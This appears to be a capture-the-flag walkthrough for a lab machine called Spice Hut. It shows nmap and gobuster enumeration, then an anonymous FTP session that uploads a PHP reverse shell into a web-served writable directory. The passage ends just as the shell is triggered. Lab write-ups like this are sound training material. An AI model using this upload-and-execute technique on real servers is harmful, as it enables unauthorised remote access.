Title: Spice Hut

We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!


Running nmap -p- -sC -sV $IP --open, we get 3 services exposed:

The FTP service allows anonymous access and hosts several files

ftp $IP
ftp> ls -la

We can download the files and see if there is anything interesting inside of them.

A username "Maya" is disclosed on the note. Also as we can see the ftp directory is world-writable!

---------------------------------

WEB

An enumeration of the web directory using gobuster reveals a "/files" directory: 

gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

Browsing this directory confirms that it contains the resources exposed by the FTP service. 

As we noticed there is a writable directory via FTP, letâ€™s upload a PHP reverse shell: 

ftp $IP
Connected to $IP
220 (vsFTPd 3.0.3)
Name (startup.thm:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> cd ftp
250 Directory successfully changed.

ftp> put rev.php 
local: rev.php remote: rev.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (51.8572 MB/s)

ftp> 221 Goodbye.

Now, browsing the uploaded resource (http://$IP/files/ftp/rev.php) allows us to get a reverse shell:
